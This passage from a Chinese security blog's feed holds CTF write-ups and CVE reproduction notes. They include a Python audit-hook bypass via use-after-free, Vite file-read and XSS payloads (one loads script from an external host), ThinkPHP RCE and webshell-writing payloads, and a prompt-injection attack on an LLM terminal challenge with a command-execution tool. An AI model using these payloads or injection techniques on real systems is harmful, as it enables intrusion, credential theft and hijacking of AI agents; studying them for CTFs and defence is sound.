class="keyword">return</span> <span class="string">&quot;success&quot;</span>    <span class="keyword">else</span>:        <span class="keyword">return</span> <span class="string">&quot;runtime error!!!&quot;</span>, <span class="number">200</span><span class="meta">@app.route(<span class="params"><span class="string">&quot;/myStatus&quot;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span><span class="keyword">def</span> <span class="title function_">status</span>():    <span class="keyword">try</span>:        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/tmp/output&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> a:            ans=a.read()    <span class="keyword">except</span>:        <span class="keyword">return</span> jsonify(&#123;            <span class="string">&quot;success&quot;</span>: <span class="literal">False</span>,        &#125;)    <span class="keyword">return</span> jsonify(&#123;    <span class="string">&quot;result&quot;</span>: &#123;        <span class="string">&quot;time&quot;</span>: <span class="number">114</span>,        <span class="string">&quot;memory&quot;</span>: <span class="number">514</span>,        <span class="string">&quot;result&quot;</span>: <span class="number">114514</span>,        <span class="string">&quot;language&quot;</span>: <span class="number">0</span>,        <span class="string">&quot;output&quot;</span>: ans,        <span class="string">&quot;compileInfo&quot;</span>: <span class="string">&quot;&quot;</span>,        <span class="string">&quot;systemInfo&quot;</span>: <span class="string">&quot;&quot;</span>,        <span class="string">&quot;count&quot;</span>: <span class="number">0</span>    &#125;,    <span class="string">&quot;success&quot;</span>:<span class="literal">True</span>&#125;)<span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span><span class="keyword">def</span> <span class="title function_">no_acm</span>(<span class="params">error</span>):    <span class="keyword">return</span> redirect(<span class="string">&quot;/&quot;</span>)<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/backup/www.zip&#x27;</span></span>)</span><span class="keyword">def</span> <span class="title function_">src</span>():    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/backup/&#x27;</span></span>)</span><span class="keyword">def</span> <span class="title function_">backup</span>():    <span class="keyword">return</span> <span class="number">403</span><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8080</span>, debug=<span class="literal">False</span>)</code></pre><p>代码审计+一点试验就可以发现提交代码时主要触发的就是eeval并且代码成功执行后会与waf拼接并写入，结果可在&#x2F;myStatus 查询</p><p>研究一下waf</p><pre><code class="highlight python"><span class="keyword">import</span> sys<span class="keyword">import</span> os<span class="keyword">import</span> math<span class="keyword">def</span> <span class="title function_">audit_checker</span>(<span class="params">event,args</span>):    <span class="keyword">if</span> <span class="keyword">not</span> event <span class="keyword">in</span> [<span class="string">&quot;builtins.input&quot;</span>,<span class="string">&quot;builtins.input/result&quot;</span>]:        <span class="keyword">raise</span> Exception(<span class="string">&quot;waf&quot;</span>)sys.addaudithook(audit_checker)</code></pre><p>有点pwn的知识，对我这种彩笔有点挑战，但是还是尝试打一下poc吧。。</p><pre><code class="highlight python"><span class="keyword">class</span> <span class="title class_">UAF</span>:    <span class="keyword">def</span> <span class="title function_">__index__</span>(<span class="params">self</span>):        <span class="keyword">global</span> memory        uaf.clear()        memory = <span class="built_in">bytearray</span>()        uaf.extend([<span class="number">0</span>] * <span class="number">56</span>)        <span class="keyword">return</span> <span class="number">1</span>uaf = <span class="built_in">bytearray</span>(<span class="number">56</span>)uaf[<span class="number">23</span>] = UAF()ptr = <span class="built_in">int</span>(<span class="built_in">str</span>(os.system.__init__).split()[-<span class="number">1</span>][<span class="number">2</span>:-<span class="number">1</span>], <span class="number">16</span>) + <span class="number">24</span>ptr = <span class="built_in">int</span>.from_bytes(memory[ptr:ptr + <span class="number">8</span>], <span class="string">&#x27;little&#x27;</span>) + <span class="number">48</span>audit_checker_addr = <span class="built_in">int</span>.from_bytes(memory[ptr:ptr + <span class="number">8</span>], <span class="string">&#x27;little&#x27;</span>) + <span class="number">0x46920</span> //对应偏移版本memory[audit_checker_addr:audit_checker_addr + <span class="number">8</span>] = [<span class="number">0</span>] * <span class="number">8</span>os.system(<span class="string">&quot;cat /flag&quot;</span>)</code></pre><p>成功打出</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>写什么输什么</p><h3 id="我也爱打ACM"><a href="#我也爱打ACM" class="headerlink" title="我也爱打ACM"></a>我也爱打ACM</h3><p>没什么好说的，命令执行</p><pre><code class="highlight plaintext">import osos.system(&#x27;cat /flag&#x27;)</code></pre><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406165857572.png" alt="image-20250406165857572"></p><h3 id="操作系统-我只用国产的"><a href="#操作系统-我只用国产的" class="headerlink" title="操作系统?我只用国产的"></a>操作系统?我只用国产的</h3><p>先打开终端查看txt拿到第一段</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406155350406.png" alt="image-20250406155350406"></p><p>解码得到<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406155431623.png" alt="image-20250406155431623"></p><p><code>zjnuctf&#123;Deep1n</code></p><p>接着根据提示打开bash执行history重复执行第一段</p><p>找到第二段</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406155609224.png" alt="image-20250406155609224"></p><p><code>_F0r3ns1c5_</code></p><p>接着根据提示32猜测那段是base32得到第三段</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406155950623.png" alt="image-20250406155950623"></p><p><code>111111s_V3ry</code></p><p>接着根据提示<code>sudo su</code>转换为root</p><p>继续查看history</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406160231350.png" alt="image-20250406160231350"></p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406160147481.png" alt="image-20250406160147481"></p><p><code>_easssssy_</code></p><p>根据最后一条提示</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406160353287.png" alt="image-20250406160353287"></p><p>在终端运行发现失败，拉到win段用010查一下</p><p>拿到flag5<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406160625101.png" alt="image-20250406160625101"></p><p><code>R1ght?&#125;</code></p><p>完整flag:zjnuctf{Deep1n_F0r3ns1c5_111111s_V3ry_easssssy_R1ght?}</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin?"></a>checkin?</h3><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406170031541.png" alt="image-20250406170031541"></p><p>主要分析这边的代码</p><p>可以看出在末尾会加一个~</p><p>那么就直接闭合前面的代码两个;;偷夹一个命令执行</p><p>最后再闭合一次’’</p><p> <img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250406142209201.png" alt="image-20250406142209201"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="解个方程再走吧"><a href="#解个方程再走吧" class="headerlink" title="解个方程再走吧"></a>解个方程再走吧</h3><p>呃呃，求解一个线性方程组+一个计算私钥和解密</p><p>先用矩阵算出来B</p><p>得到p,q,r</p><p>验证是素数后直接进行一个常规的RSA即可</p><pre><code class="highlight python"><span class="keyword">from</span> sympy <span class="keyword">import</span> Matrix<span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, isPrimehint1 = <span class="number">79333650588725980145842690308459793002212384733760792497903824255475158426421388758884515854200584020175891983698755801887895178728215285671100862522546388920</span>hint2 = <span class="number">42091939085030707750026943885448586020057668249489766328512130903699537123923304865199162545942232848524822773449884502246598542894968112652618125488987069022</span>hint3 = <span class="number">47921639502651352998409354170011465949752789835571950468703988521419628212309010862554662374631739734695758683737532319227640559546280393992908749025031664459</span>c = <span class="number">586259203274257904218292861460908156791643965546148862992509079573222630681556586135763674536546688690974489814788756340855428929464618526167483888642489290771336451603000026408733311715167395195739872325726528303132908225270749388819542814906773941078450582493580078337058352635256194643788754312978887738514884542098007460979027337953355588053092228217870701331036051715877358001679941780694544265894801823172720742507964727231224661041139619112619170939564249</span>e = <span class="number">65537</span>A = Matrix([    [<span class="number">1144</span>, <span class="number">5143</span>, <span class="number">1281</span>],    [<span class="number">1869</span>, <span class="number">1356</span>, <span class="number">1495</span>],    [<span class="number">1620</span>, <span class="number">1762</span>, <span class="number">1957</span>]])B = Matrix([hint1, hint2, hint3])solution = A.solve(B)p = solution[<span class="number">0</span>]q = solution[<span class="number">1</span>]r = solution[<span class="number">2</span>]p, q, r = <span class="built_in">int</span>(p), <span class="built_in">int</span>(q), <span class="built_in">int</span>(r)<span class="keyword">assert</span> isPrime(p) <span class="keyword">and</span> isPrime(q) <span class="keyword">and</span> isPrime(r), <span class="string">&quot;其中一个解不是素数&quot;</span>n = p * q * rphi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>) * (r - <span class="number">1</span>)d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)m = <span class="built_in">pow</span>(c, d, n)flag = long_to_bytes(m)<span class="built_in">print</span>(flag.decode())</code></pre><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h2 id="AI"><a href="#AI" class="headerlink" title="AI"></a>AI</h2><p>赛后复现发现自己真是个铸币唉唉，其实三个都是最简单的RCE</p><p>挂个源码</p><pre><code class="highlight python"><span class="keyword">class</span> <span class="title class_">CommandExecuter</span>(<span class="title class_ inherited__">BaseAI</span>):    tools = [        &#123;            <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span>,            <span class="string">&quot;function&quot;</span>: &#123;                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;execute_safe_linux_command&quot;</span>,                <span class="string">&quot;description&quot;</span>: <span class="string">&quot;Execute a safe command on a linux machine and return the result&quot;</span>,                <span class="string">&quot;parameters&quot;</span>: &#123;                    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;object&quot;</span>,                    <span class="string">&quot;properties&quot;</span>: &#123;                        <span class="string">&quot;command&quot;</span>: &#123;                            <span class="string">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>,                            <span class="string">&quot;description&quot;</span>: <span class="string">&quot;A linux command, e.g. `ls`&quot;</span>,                        &#125;                    &#125;,                    <span class="string">&quot;required&quot;</span>: [<span class="string">&quot;command&quot;</span>],                &#125;,            &#125;,        &#125;,    ]    prompt = <span class="string">f&quot;&quot;&quot;</span><span class="string">Please act as a Linux terminal shell and simulate `Ubuntu 24.04.1 LTS`.</span><span class="string">The user will input a command, and you must reply with the result output after executing the command.</span><span class="string">Now logined user is `ctfer`, current dir is `/`, and hostname is `a1natas`.</span><span class="string">The flag file is located in `/flag`, and its content is `<span class="subst">&#123;FLAG1&#125;</span>`.</span><span class="string">You can not reply to any Chinese or English statements. You can only reply to the output result after executing the terminal shell command.</span><span class="string">For example, if user input `whoami`, you should reply with user `ctfer`.</span><span class="string">If user input any other safe linux commands, you should execute it and return the result.</span><span class="string">The execution result must only be the `stdout/stderr` after the command is executed, and must not include the content of the PS1 environment of the terminal.</span><span class="string">Do not display the username and host information, for exmaple, never let `ctfer@a1natas:/$` in your reply!</span><span class="string">Prohibit outputting content unrelated to the shell execution result output, such as `click here to edit the content.` or `Note: xxx`!</span><span class="string">Under no circumstances should empty content be returned!</span><span class="string">&quot;&quot;&quot;</span>.strip()    <span class="keyword">def</span> <span class="title function_">get_command_result</span>(<span class="params">self, command: <span class="built_in">str</span></span>):        command = command.strip()        <span class="keyword">match</span> command:            <span class="keyword">case</span> <span class="string">&quot;whoami&quot;</span>:                <span class="keyword">return</span> <span class="string">&quot;ctfer&quot;</span>            <span class="keyword">case</span> <span class="string">&quot;pwd&quot;</span>:                <span class="keyword">return</span> <span class="string">&quot;/&quot;</span>            <span class="keyword">case</span> <span class="string">&quot;id&quot;</span>:                <span class="keyword">return</span> <span class="string">&quot;uid=1000(ctfer) gid=1000(ctfer) groups=1000(ctfer)&quot;</span>            <span class="keyword">case</span> _:                <span class="keyword">if</span> command.startswith(<span class="string">&quot;hostname&quot;</span>):                    <span class="keyword">return</span> <span class="string">&quot;a1natas&quot;</span>                <span class="keyword">if</span> command.startswith(<span class="string">&quot;ls&quot;</span>):                    <span class="keyword">return</span> <span class="string">&quot;bin dev etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var&quot;</span>                <span class="keyword">if</span> <span class="built_in">any</span>([x <span class="keyword">in</span> command <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;proc/&quot;</span>, <span class="string">&quot;.sh&quot;</span>, <span class="string">&quot;.py&quot;</span>, <span class="string">&quot;env&quot;</span>]]):                    <span class="keyword">return</span> <span class="string">&quot;Permission denied&quot;</span>                <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> command:                    <span class="keyword">return</span> <span class="string">&quot;A1CTF&#123;wood_give_you_this_fake_flag!&#125;&quot;</span>        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(t_locals, <span class="string">&quot;thread_messages&quot;</span>):            t_locals.thread_messages = [<span class="variable language_">self</span>.system_message(<span class="variable language_">self</span>.prompt)]        <span class="keyword">try</span>:            thread_messages = t_locals.thread_messages            thread_messages.append(<span class="variable language_">self</span>.user_message(command))            ai_result = <span class="variable language_">self</span>.send_messages(thread_messages)            thread_messages.append(ai_result)            <span class="keyword">if</span> <span class="keyword">not</span> ai_result.tool_calls:                <span class="keyword">if</span> ai_result.content.startswith(<span class="string">&quot;```&quot;</span>) <span class="keyword">and</span> ai_result.content.endswith(                    <span class="string">&quot;```&quot;</span>                ):                    ai_result.content = <span class="string">&quot;\n&quot;</span>.join(ai_result.content.splitlines()[<span class="number">1</span>:-<span class="number">1</span>])                <span class="keyword">return</span> ai_result.content            tool = ai_result.tool_calls[<span class="number">0</span>]            function_name = tool.function.name            function_args = tool.function.arguments            exec_res = <span class="string">&quot;command not found&quot;</span>            <span class="keyword">if</span> function_name == <span class="string">&quot;execute_safe_linux_command&quot;</span>:                args = json_loads(function_args)                <span class="keyword">while</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(args, <span class="built_in">dict</span>):                    args = json_loads(args)                <span class="keyword">if</span> cmd := args.get(<span class="string">&quot;command&quot;</span>):                    exec_res = <span class="variable language_">self</span>.execute_safe_linux_command(cmd)            thread_messages.append(<span class="variable language_">self</span>.tool_message(tool.<span class="built_in">id</span>, exec_res))            ai_result = <span class="variable language_">self</span>.send_messages(thread_messages)            <span class="keyword">if</span> ai_result.content.startswith(<span class="string">&quot;```&quot;</span>) <span class="keyword">and</span> ai_result.content.endswith(                <span class="string">&quot;```&quot;</span>            ):                ai_result.content = <span class="string">&quot;\n&quot;</span>.join(ai_result.content.splitlines()[<span class="number">1</span>:-<span class="number">1</span>])            thread_messages.append(ai_result)            <span class="keyword">return</span> ai_result.content        <span class="keyword">except</span> Exception:            <span class="keyword">from</span> traceback <span class="keyword">import</span> format_exc            <span class="built_in">print</span>(<span class="string">f&quot;get_command_result error: <span class="subst">&#123;format_exc()&#125;</span>\n\n&quot;</span>)            <span class="keyword">return</span> <span class="string">&quot;Runtime Error...&quot;</span>    <span class="keyword">def</span> <span class="title function_">execute_safe_linux_command</span>(<span class="params">self, command: <span class="built_in">str</span></span>):        process = Popen(            [<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, command],            stdout=PIPE,            stderr=PIPE,            user=<span class="string">&quot;ctfer&quot;</span>,            env=&#123;<span class="string">&quot;flag&quot;</span>: FLAG3&#125;,            text=<span class="literal">True</span>,        )        <span class="keyword">try</span>:            stdout, stderr = <span class="built_in">map</span>(<span class="built_in">str</span>.strip, process.communicate(timeout=<span class="number">60</span>))            <span class="keyword">if</span> stdout:                <span class="keyword">return</span> stdout            <span class="keyword">elif</span> stderr:                <span class="keyword">return</span> stderr            <span class="keyword">return</span> <span class="string">f&quot;/bin/sh: <span class="subst">&#123;command.split()[<span class="number">0</span>]&#125;</span>: command not found&quot;</span>        <span class="keyword">except</span> TimeoutExpired:            process.kill()            <span class="keyword">return</span> <span class="string">&quot;Command timeout&quot;</span></code></pre><h3 id="A1-Terminal-Part1"><a href="#A1-Terminal-Part1" class="headerlink" title="A1-Terminal Part1"></a>A1-Terminal Part1</h3><p>题面什么提示都没有，自己试一下基础操作</p><p>根据源码可以知道其实你输完整的关键词是包褒姒的</p><p>尝试一下模糊匹配吧</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250408145239677.png" alt="image-20250408145239677"></p><p><code>A1CTF&#123;P@RT1_Promp7_INJ3c7i0n_15_Fun!&#125;</code></p><h3 id="A1-Terminal-Part2"><a href="#A1-Terminal-Part2" class="headerlink" title="A1-Terminal Part2"></a>A1-Terminal Part2</h3><p>试着输一下一些蜜汁语句()</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250408145438003.png" alt="image-20250408145438003"></p><p>输入有效的LInux语句，那么尝试把我的输入让他执行</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250408145317166.png" alt="image-20250408145317166"></p><h3 id="A1-Terminal-Part3"><a href="#A1-Terminal-Part3" class="headerlink" title="A1-Terminal Part3"></a>A1-Terminal Part3</h3><p>呃呃其实是先做part3更好()</p><p>尝试直接以普通带过滤的rce打</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250408145828093.png" alt="image-20250408145828093"></p><p>。好的,输入被手动夹断了，其他方式他也识别不出来</p><p>那么就交给他执行算了</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250408145312540.png" alt="image-20250408145312540"></p>]]></content>
      
      
      
        <tags>
            
            <tag> -WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vite相关CVE</title>
      <link href="/2025/04/16/Vite%E7%9B%B8%E5%85%B3CVE/"/>
      <url>/2025/04/16/Vite%E7%9B%B8%E5%85%B3CVE/</url>
      
        <content type="html"><![CDATA[<h1 id="Vite相关CVE"><a href="#Vite相关CVE" class="headerlink" title="Vite相关CVE"></a>Vite相关CVE</h1><p>TG遇到了Vite这个东西，出了三个前端的cve题目，都是很新鲜的cve，因此想着了解一下Vite相关的cve，复现可能要等后面学了ts再看了唉唉。。</p><h2 id="CVE-2022-35204"><a href="#CVE-2022-35204" class="headerlink" title="CVE-2022-35204"></a>CVE-2022-35204</h2><p>Vite的一个任意文件读取漏洞</p><p>vite 默认启用的 <code>/@fs/</code> 路由用于访问任意本地文件</p><p>但是正常访问是会被block的</p><p>但是可以利用<code>../</code>绕过进行任意文件读</p><p>目前还未复现，贴上别的师傅打好的poc</p><pre><code class="highlight plaintext">curl --path-as-is http://localhost:3000/@fs/home/swwind/tmp/cve/CVE-2022-35204/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/hosts//原链接 https://blog.sww.moe/post/exploits/cve-2022-35204/</code></pre><p>这个漏洞的成因大概就是decodeURI这个函数的漏洞</p><pre><code class="highlight plaintext">decodeURI在解码时会将大部分的ASCII标点符号和预留字符保留不变，包括/和%2f这样就会导致/../未被检测到而绕过了安全检测传入的/home/swwind/tmp/cve/CVE-2022-35204/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/hosts 的时候，decodeURI 函数解析出来的结果会保留其中的所有 %2f，再经由下一步的 path.resolve 函数解析，最终结果是 /home/swwind/tmp/cve/CVE-2022-35204/..%2f..%2f..%2f..%2f../etc/hosts，由此非常轻松地就绕过了 vite 的允许目录检查。</code></pre><p>相比之下，decodeURIcomponent就要好一些，因为其解码 URI 组件中的字符，而不是完整的 URI。它可以正确解码任何 ASCII 字符或 UTF-8 字符集，包括默认 URI 编码中使用的所有预留字符和其他特殊字符</p><p>在decodeURIcomponent的处理后，传入的参数被解析为<code>/home/swwind/tmp/cve/CVE-2022-35204/../../../../../etc/hosts</code>，会被正确过滤为<code>/etc/hosts</code>，从而防御了任意文件读取</p><h2 id="CVE-2023-49293"><a href="#CVE-2023-49293" class="headerlink" title="CVE-2023-49293"></a>CVE-2023-49293</h2><p>Vite的一个XSS漏洞</p><p>复现可能要回头了把<a href="https://github.com/vitejs/vite/security/advisories/GHSA-92r3-m2mg-pj97">XSS vulnerability in <code>server.transformIndexHtml</code> via URL payload · Advisory · vitejs&#x2F;vite · GitHub</a></p><p>poc就是直接在后面query打一个普通的反射xss语句，直接弹</p><pre><code class="highlight plaintext">?%22%3E%3C/script%3E%3Cscript%3Ealert(%27boom%27)%3C/script%3E//?&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(&#x27;boom&#x27;)&lt;/script&gt;</code></pre><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250416124525018.png" alt="image-20250416124525018"></p><p>再尝试构造弹了一下</p><pre><code class="highlight plaintext">?&quot;&gt;&lt;/script&gt;&lt;script src=&quot;https://71g9hx8u.requestrepo.com/&quot;;&gt; &lt; /script&gt;</code></pre><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250416125624323.png" alt="image-20250416125624323"></p><h2 id="CVE-2025-30208"><a href="#CVE-2025-30208" class="headerlink" title="CVE-2025-30208"></a>CVE-2025-30208</h2><p>还是相同的<code>@fs</code>的利用</p><p>这边贴poc，回头会补复现</p><pre><code class="highlight plaintext">/@fs/etc/passwd?import&amp;raw??/@fs/etc/passwd?raw??</code></pre><p><a href="https://www.xaitx.com/tech/2025-03-26.html">Vite 任意文件读取漏洞分析复现（CVE-2025-30208） | 小艾博客</a></p><h2 id="CVE-2025-31125"><a href="#CVE-2025-31125" class="headerlink" title="CVE-2025-31125"></a>CVE-2025-31125</h2><p>这个洞是利用inline的规则配合.wsam进行绕过(是对上一个CVE的补丁的绕过)</p><pre><code class="highlight plaintext">/@fs/C://windows/win.ini?import&amp;inline=1.wasm?init还有两个下面那个大佬打出来的未公开poc//适用6.2.4/@fs/etc/passwd?import&amp;?meteorkai.svg?.wasm?init/@fs/etc/shadow?meteorkai.svg?.wasm?init  //这里没有import是因为读取的文件没有后缀，isJSRequest为true</code></pre><p>这边引用一下大佬的解释好了</p><pre><code class="highlight plaintext">除了?url和?raw还有一种内联的方法?inline，他的作用是：将文件（如图片、字体、WASM 等）的内容转换为 Base64 编码字符串 或 直接嵌入到 JS/HTML/CSS 中，避免额外的 HTTP 请求?init主要用于 WebAssembly（.wasm）文件的初始化，默认只有.wasm支持?init其他如.data、.bin可以通过插件拓展支持通过这种新的方法绕过了修复后的正则过滤//原链接https://cloud.tencent.com/developer/article/2513407</code></pre><p><a href="https://xz.aliyun.com/news/17655">Vite开发服务器任意文件读取漏洞分析复现（CVE-2025-31125）-先知社区</a></p><h2 id="CVE-2025-31486"><a href="#CVE-2025-31486" class="headerlink" title="CVE-2025-31486"></a>CVE-2025-31486</h2><p>先贴出poc</p><pre><code class="highlight plaintext">/etc/passwd?.svg?.wasm?init/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&amp;?raw</code></pre><p><a href="https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x">原链</a></p><p>其中第二个poc是需要先探出大概的路径才能打的</p><p><a href="https://xz.aliyun.com/news/17730">Vite开发服务器任意文件读取漏洞分析复现（CVE-2025-31486）-先知社区</a></p><h2 id="CVE-2025-32395"><a href="#CVE-2025-32395" class="headerlink" title="CVE-2025-32395"></a>CVE-2025-32395</h2><p>poc</p><pre><code class="highlight plaintext">curl --request-target /@fs/Users/doggy/Desktop/vite-project/#/../../../../../etc/passwd http://127.0.0.1:5173</code></pre><p><a href="https://github.com/vitejs/vite/security/advisories/GHSA-356w-63v5-8wf4">原链</a></p><p><a href="https://xz.aliyun.com/news/17745">Vite任意文件读取bypass调试分析（CVE-2025-32395）-先知社区</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> -CVE -Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP历代版本漏洞复现</title>
      <link href="/2025/04/14/ThinkPHP%E5%8E%86%E4%BB%A3%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2025/04/14/ThinkPHP%E5%8E%86%E4%BB%A3%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP历代版本漏洞复现-未补完"><a href="#ThinkPHP历代版本漏洞复现-未补完" class="headerlink" title="ThinkPHP历代版本漏洞复现(未补完)"></a>ThinkPHP历代版本漏洞复现(未补完)</h1><p>校赛遇到一道PHP5.0.23版本的rce漏洞,复现完想着把整个这系列的洞都打一下</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250416142405466.png" alt="image-20250416142405466"></p><h2 id="ThinkPHP-2-x-RCE"><a href="#ThinkPHP-2-x-RCE" class="headerlink" title="ThinkPHP 2.x RCE"></a>ThinkPHP 2.x RCE</h2><p>这个版本下有个preg_replace的e模式匹配漏洞</p><pre><code class="highlight php"><span class="variable">$res</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;@(\w+)&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;([^&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;\/]+)@e&#x27;</span>, <span class="string">&#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;</span>, <span class="title function_ invoke__">implode</span>(<span class="variable">$depr</span>,<span class="variable">$paths</span>));</code></pre><p>具体原理其实不大懂，后面自己的理解大概会补。？</p><p>先把洞打穿吧</p><p>这里贴一下BUU的题目</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250414191818633.png" alt="image-20250414191818633"></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ul><li><p>在<strong>PHP</strong>当中，**<code>$&#123;&#125;</code>**是可以构造一个变量的，<code>&#123;&#125;</code>写的是一般的字符，那么就会被当成变量，比如<code>$&#123;a&#125;</code>等价于<code>$a</code></p></li><li><p>thinkphp 所有的主入口文件默认访问index控制器（模块）</p></li><li><p>thinkphp 所有的控制器默认执行index动作（方法）</p></li><li><pre><code>http://serverName/index.php（或者其它应用入口文件）?s=/模块/控制器/操作/[参数名/参数值...]<pre><code class="highlight plaintext">- 数组`$var`在路径存在模块和动作时，会去除掉前2个值。而数组`$var`来自于`explode($depr,trim($_SERVER[&#x27;PATH_INFO&#x27;],&#x27;/&#x27;));`也就是路径。  所以我们可以构造poc如下：```phps=a/b/c/$&#123;phpinfo()&#125;s=a/b/c/$&#123;phpinfo()&#125;/c/d/e/fs=a/b/c/d/e/$&#123;phpinfo()&#125;.......</code></pre></code></pre></li></ul><p>所以连蚁剑或者直接phpinfo()查一下都可以</p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code class="highlight php">s=/<span class="number">1</span>/<span class="number">2</span>/<span class="number">3</span>/$&#123;@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>])&#125;s=/index/index/index/$&#123;@<span class="title function_ invoke__">phpinfo</span>()&#125;s=/<span class="number">1</span>/<span class="number">2</span>/c/$&#123;@<span class="keyword">print</span>(<span class="title function_ invoke__">system</span>(env))&#125;</code></pre><h2 id="ThinkPHP-5-0-20-RCE"><a href="#ThinkPHP-5-0-20-RCE" class="headerlink" title="ThinkPHP 5.0.20 RCE"></a>ThinkPHP 5.0.20 RCE</h2><pre><code class="highlight php">s=index/\think\app/invokefunction&amp;<span class="function"><span class="keyword">function</span>=<span class="title">call_user_func_array</span>&amp;<span class="title">vars</span>[0]=<span class="title">system</span>&amp;<span class="title">vars</span>[1][]=<span class="title">env</span></span><span class="function"></span><span class="function"><span class="title">s</span>=<span class="title">index</span>/\<span class="title">think</span>\<span class="title">app</span>/<span class="title">invokefunction</span>&amp;<span class="title">function</span>=<span class="title">call_user_func_array</span>&amp;<span class="title">vars</span>[0]=<span class="title">file_put_contents</span>&amp;<span class="title">vars</span>[1][]=1.<span class="title">php</span>&amp;<span class="title">vars</span>[1][]=&lt;?<span class="title">php</span> @<span class="title">eval</span>(<span class="params"><span class="variable">$_POST</span>[pwn]</span>)</span>;<span class="meta">?&gt;</span></code></pre><h2 id="ThinkPHP-5-0-23-RCE"><a href="#ThinkPHP-5-0-23-RCE" class="headerlink" title="ThinkPHP 5.0.23 RCE"></a>ThinkPHP 5.0.23 RCE</h2><pre><code class="highlight php">s=captchaPOST: _method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=<span class="keyword">echo</span> <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span> &gt; test.phpPOST: _method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=<span class="keyword">echo</span> <span class="string">&quot;&lt;?php @eval(<span class="subst">$_POST</span>[&#x27;pwn&#x27;]); ?&gt;&quot;</span> &gt; test.php</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> -PHP -Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深度学习网页前端之CSS</title>
      <link href="/2025/03/30/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%BD%91%E9%A1%B5%E5%89%8D%E7%AB%AF%E4%B9%8BCSS/"/>
